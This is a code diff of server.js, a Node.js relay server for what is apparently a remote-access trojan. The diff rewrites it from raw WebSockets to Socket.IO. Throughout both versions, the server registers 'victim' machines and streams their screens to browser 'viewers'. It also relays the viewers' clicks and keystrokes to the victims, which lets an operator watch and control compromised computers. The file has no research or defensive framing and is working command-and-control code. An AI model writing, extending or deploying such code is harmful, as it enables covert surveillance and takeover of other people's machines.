@@ -1,208 +1,198 @@
-// server.js — Relay + UI server. Deploy this on Render as a Web Service.
-const express = require('express');
-const http = require('http');
-const { WebSocketServer } = require('ws');
-const path = require('path');
-
-const PORT = process.env.PORT || 10000;
-const PING_INTERVAL = 15000;
-const PING_TIMEOUT = 8000;
+const express = require("express");
+const http = require("http");
+const { Server } = require("socket.io");
+const path = require("path");
 
 const app = express();
 const server = http.createServer(app);
-
-app.get('/healthz', (req, res) => res.end('OK'));
-app.get('/health', (req, res) => res.end('OK'));
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'client.html'));
+const io = new Server(server, {
+  transports: ["websocket", "polling"],
+  cors: { origin: "*" },
+  maxHttpBufferSize: 10 * 1024 * 1024,
+  pingTimeout: 60000,
+  pingInterval: 25000
 });
 
-const wss = new WebSocketServer({ 
-  server,
-  maxPayload: 1024 * 1024 * 2
-});
+const PORT = process.env.PORT || 8080;
 
+// ── State ──
+// Victims: victimId -> { socket, info }
 const victims = new Map();
+// Viewers: socket -> { viewing: victimId }
 const viewers = new Map();
+// Active frame streams: victimId -> Set of viewer sockets
+const frameStreams = new Map();
 
-function heartbeat() {
-  this.isAlive = true;
-}
+// ── Serve client HTML ──
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "client.html"));
+});
 
-wss.on('connection', (ws, req) => {
-  ws.isAlive = true;
-  ws.on('pong', heartbeat);
+app.get("/healthz", (req, res) => {
+  res.status(200).send("OK");
+});
 
-  let role = null;
-  let myId = null;
+// ── Socket.IO ──
+io.on("connection", (socket) => {
+  console.log(`[+] Connection: ${socket.id}`);
 
-  ws.on('message', (raw, isBinary) => {
-    if (isBinary) {
-      if (role !== 'victim' || !myId) return;
-      const victimEntry = victims.get(myId);
-      if (!victimEntry) return;
-      
-      for (const [vid, vw] of viewers) {
-        if (vw.victimId === myId && vw.ws.readyState === 1) {
-          try { vw.ws.send(raw); } catch(e) {}
-        }
-      }
-      return;
-    }
+  // ── VICTIM REGISTRATION ──
+  socket.on("register-victim", (data) => {
+    const victimId = data.id || socket.id;
+    victims.set(victimId, {
+      socket,
+      w: data.w || 1920,
+      h: data.h || 1080,
+      connectedAt: Date.now()
+    });
+    socket.victimId = victimId;
+    socket.role = "victim";
 
-    let msg;
-    try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
+    console.log(`[VICTIM ONLINE] ${victimId} (${data.w}x${data.h})`);
 
-    switch (msg.type) {
-      case 'register_victim': {
-        role = 'victim';
-        myId = msg.victimId;
-        
-        victims.set(myId, { 
-          ws, 
-          info: {
-            screenWidth: msg.screenWidth || 1920,
-            screenHeight: msg.screenHeight || 1080,
-            hostname: msg.hostname || myId
+    // Notify all viewers that victim list changed
+    broadcastVictimList();
+
+    // Start frame stream handler for this victim
+    socket.on("frame", (frameData) => {
+      // Only forward frames if someone is actively viewing this victim
+      const stream = frameStreams.get(victimId);
+      if (stream && stream.size > 0) {
+        stream.forEach((viewerSocket) => {
+          if (viewerSocket.connected) {
+            viewerSocket.emit("frame", { victimId, buf: frameData.buf });
+          } else {
+            stream.delete(viewerSocket);
           }
         });
-        
-        ws.send(JSON.stringify({ type: 'registered', victimId: myId }));
-        console.log(`[VICTIM] ${myId} ${msg.screenWidth}x${msg.screenHeight}`);
-        broadcastVictimList();
-        
-        // Notify waiting viewers
-        for (const [vid, vw] of viewers) {
-          if (vw.victimId === myId) {
-            const info = victims.get(myId).info;
-            vw.ws.send(JSON.stringify({
-              type: 'victim_ready',
-              victimId: myId,
-              screenWidth: info.screenWidth,
-              screenHeight: info.screenHeight
-            }));
+      }
+    });
+
+    socket.on("disconnect", () => {
+      console.log(`[VICTIM OFFLINE] ${victimId}`);
+      victims.delete(victimId);
+      frameStreams.delete(victimId);
+      broadcastVictimList();
+    });
+  });
+
+  // ── VIEWER (browser) REGISTRATION ──
+  socket.on("register-viewer", () => {
+    socket.role = "viewer";
+    viewers.set(socket, { viewing: null });
+    console.log(`[VIEWER ONLINE] ${socket.id}`);
+
+    // Send victim list immediately
+    const list = getVictimList();
+    socket.emit("victim-list", list);
+
+    socket.on("select-victim", (victimId) => {
+      const victim = victims.get(victimId);
+      if (!victim) {
+        socket.emit("error", { msg: "Victim not available" });
+        return;
+      }
+
+      // Unsubscribe from previous victim
+      const prev = viewers.get(socket);
+      if (prev && prev.viewing) {
+        const prevStream = frameStreams.get(prev.viewing);
+        if (prevStream) {
+          prevStream.delete(socket);
+          if (prevStream.size === 0) {
+            // Tell victim to slow down when nobody's watching
+            victim.socket.emit("viewer-count", 0);
           }
         }
-        break;
       }
 
-      case 'register_viewer': {
-        role = 'viewer';
-        myId = 'viewer_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
-        const targetId = msg.victimId;
-        viewers.set(myId, { ws, victimId: targetId });
-
-        // Send victim list
-        ws.send(JSON.stringify({
-          type: 'victim_list',
-          victims: Array.from(victims.entries()).map(([id, v]) => ({
-            id,
-            screenWidth: v.info.screenWidth,
-            screenHeight: v.info.screenHeight,
-            hostname: v.info.hostname
-          }))
-        }));
-
-        // Send viewer count to victim
-        let viewerCount = 0;
-        for (const [vid, vw] of viewers) {
-          if (vw.victimId === targetId) viewerCount++;
-        }
-        const victimEntry = victims.get(targetId);
-        if (victimEntry && victimEntry.ws.readyState === 1) {
-          victimEntry.ws.send(JSON.stringify({ type: 'viewer_count', count: viewerCount }));
-          ws.send(JSON.stringify({
-            type: 'victim_ready',
-            victimId: targetId,
-            screenWidth: victimEntry.info.screenWidth,
-            screenHeight: victimEntry.info.screenHeight
-          }));
-        } else {
-          ws.send(JSON.stringify({ type: 'waiting', victimId: targetId }));
-        }
-        break;
+      // Subscribe to new victim
+      viewers.set(socket, { viewing: victimId });
+      if (!frameStreams.has(victimId)) {
+        frameStreams.set(victimId, new Set());
       }
+      frameStreams.get(victimId).add(socket);
 
-      case 'mousedelta':
-      case 'click':
-      case 'keydown':
-      case 'keyup': {
-        if (role !== 'viewer' || !myId) return;
-        const vw = viewers.get(myId);
-        if (!vw) return;
-        const victimEntry = victims.get(vw.victimId);
-        if (victimEntry && victimEntry.ws.readyState === 1) {
-          victimEntry.ws.send(raw);
-        }
-        break;
+      // Tell victim someone is watching (they should start sending frames)
+      victim.socket.emit("viewer-count", frameStreams.get(victimId).size);
+
+      // Send victim info
+      socket.emit("victim-info", {
+        id: victimId,
+        w: victim.w,
+        h: victim.h
+      });
+
+      console.log(`[VIEWING] ${socket.id} -> ${victimId}`);
+    });
+
+    socket.on("click", (data) => {
+      const viewer = viewers.get(socket);
+      if (!viewer || !viewer.viewing) return;
+      const victim = victims.get(viewer.viewing);
+      if (victim && victim.socket.connected) {
+        victim.socket.emit("click", { x: data.x, y: data.y, btn: data.btn || "left" });
       }
-    }
+    });
+
+    socket.on("key", (key) => {
+      const viewer = viewers.get(socket);
+      if (!viewer || !viewer.viewing) return;
+      const victim = victims.get(viewer.viewing);
+      if (victim && victim.socket.connected) {
+        victim.socket.emit("key", key);
+      }
+    });
+
+    socket.on("disconnect", () => {
+      console.log(`[VIEWER OFFLINE] ${socket.id}`);
+      const viewer = viewers.get(socket);
+      if (viewer && viewer.viewing) {
+        const stream = frameStreams.get(viewer.viewing);
+        if (stream) {
+          stream.delete(socket);
+          if (stream.size === 0) {
+            const victim = victims.get(viewer.viewing);
+            if (victim) {
+              victim.socket.emit("viewer-count", 0);
+            }
+          }
+        }
+      }
+      viewers.delete(socket);
+    });
   });
 
-  ws.on('close', () => {
-    if (role === 'victim' && myId) {
-      const oldEntry = victims.get(myId);
-      if (oldEntry && oldEntry.ws === ws) {
-        victims.delete(myId);
-        console.log(`[VICTIM OFFLINE] ${myId}`);
-        broadcastVictimList();
-      }
-    } else if (role === 'viewer' && myId) {
-      const vw = viewers.get(myId);
-      if (vw) {
-        // Update viewer count for that victim
-        const targetId = vw.victimId;
-        viewers.delete(myId);
-        let count = 0;
-        for (const [vid, vw2] of viewers) {
-          if (vw2.victimId === targetId) count++;
-        }
-        const ve = victims.get(targetId);
-        if (ve && ve.ws.readyState === 1) {
-          ve.ws.send(JSON.stringify({ type: 'viewer_count', count }));
-        }
-      }
+  // ── Viewer requests victim list ──
+  socket.on("get-victims", () => {
+    if (socket.role === "viewer") {
+      socket.emit("victim-list", getVictimList());
     }
   });
-
-  ws.on('error', () => {});
 });
 
-function broadcastVictimList() {
-  const list = Array.from(victims.entries())
-    .filter(([_, v]) => v.ws.readyState === 1)
-    .map(([id, v]) => ({
+function getVictimList() {
+  const list = [];
+  for (const [id, victim] of victims) {
+    list.push({
       id,
-      screenWidth: v.info.screenWidth,
-      screenHeight: v.info.screenHeight,
-      hostname: v.info.hostname
-    }));
-  
-  const msg = JSON.stringify({ type: 'victim_list', victims: list });
-  for (const [vid, vw] of viewers) {
-    if (vw.ws.readyState === 1) {
-      try { vw.ws.send(msg); } catch(e) {}
+      w: victim.w,
+      h: victim.h,
+      connectedAt: victim.connectedAt
+    });
+  }
+  return list;
+}
+
+function broadcastVictimList() {
+  const list = getVictimList();
+  for (const [socket, viewer] of viewers) {
+    if (socket.connected) {
+      socket.emit("victim-list", list);
     }
   }
 }
 
-const keepalive = setInterval(() => {
-  wss.clients.forEach((ws) => {
-    if (ws.isAlive === false) return ws.terminate();
-    ws.isAlive = false;
-    ws.ping();
-  });
-}, PING_INTERVAL);
-
-wss.on('close', () => clearInterval(keepalive));
-
-process.on('SIGTERM', () => {
-  clearInterval(keepalive);
-  wss.clients.forEach((ws) => ws.close());
-  server.close(() => process.exit(0));
-});
-
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[RELAY] Running on :${PORT}`);
+server.listen(PORT, "0.0.0.0", () => {
+  console.log(`[SERVER] Listening on http://0.0.0.0:${PORT}`);
 });
